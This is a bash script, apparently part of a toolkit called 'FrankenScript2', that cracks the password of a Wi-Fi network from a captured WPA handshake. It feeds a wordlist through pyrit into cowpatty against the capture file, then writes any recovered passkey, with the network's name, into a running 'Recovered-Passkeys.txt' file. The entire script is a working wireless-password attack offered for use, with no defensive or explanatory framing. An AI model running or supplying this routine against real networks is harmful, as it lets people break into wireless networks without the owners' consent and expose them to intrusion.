#!/bin/bash
#
#
printf '\033[8;24;87t'
RED=$(tput setaf 1 && tput bold)
GREEN=$(tput setaf 2 && tput bold)
STAND=$(tput sgr0)
BLUE=$(tput setaf 6 && tput bold)

AP_essid=$(cat $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/Handshake_File.txt | sed 's/.cap//g' | awk '{ print $1 }')
Capture_File=$(cat $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/Handshake_File.txt)
Wordlist=$(cat $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/WordlistNameLocation.txt)

cat $Wordlist | pyrit -e $AP_essid -i - -o - passthrough | cowpatty -d - -r $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/$Capture_File -s $AP_essid | tee $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/Handshake_Cracking1.txt

Passkey_Check1=$(grep "The PSK is" $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/Handshake_Cracking1.txt)

if [[ $Passkey_Check1 ]]; then
   clear
   echo "$Passkey_Check1"
   echo $Passkey_Check1 > $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/$AP_essid"_Recovered_Handshake_Passkey".txt
   echo 'AP ESSID: '$AP_essid'' >> $HOME/FrankenScript2/Recovered-Passkeys.txt
   cat $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/$AP_essid"_Recovered_Handshake_Passkey".txt | sed -e 's/"//g' -e 's/[.]//g' -e 's/is/is:/g' >> $HOME/FrankenScript2/Recovered-Passkeys.txt
   echo '' >> $HOME/FrankenScript2/Recovered-Passkeys.txt

   killall Handshake_Cracking_Using_A_Wordlist2.sh

   if [ "$(pidof tac)" ] 
   then
      killall tac
   fi

   if [ "$(pidof pyrit)" ] 
   then
      killall pyrit
   fi

   if [ "$(pidof cowpatty)" ] 
   then
      killall cowpatty
   fi

   if [ "$(pidof tee)" ] 
   then
      killall tee
   fi

   read -p $GREEN"Press $RED[Enter]$GREEN to finish and close this xterm window."$STAND

   rm $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/*.cap
   rm $HOME/FrankenScript2/Temp_Working_Dirctory/Handshake_Cracking/*.txt
else
   echo "Password not found, the xterm window will close in 5 seconds..."
   sleep 5
fi

exit
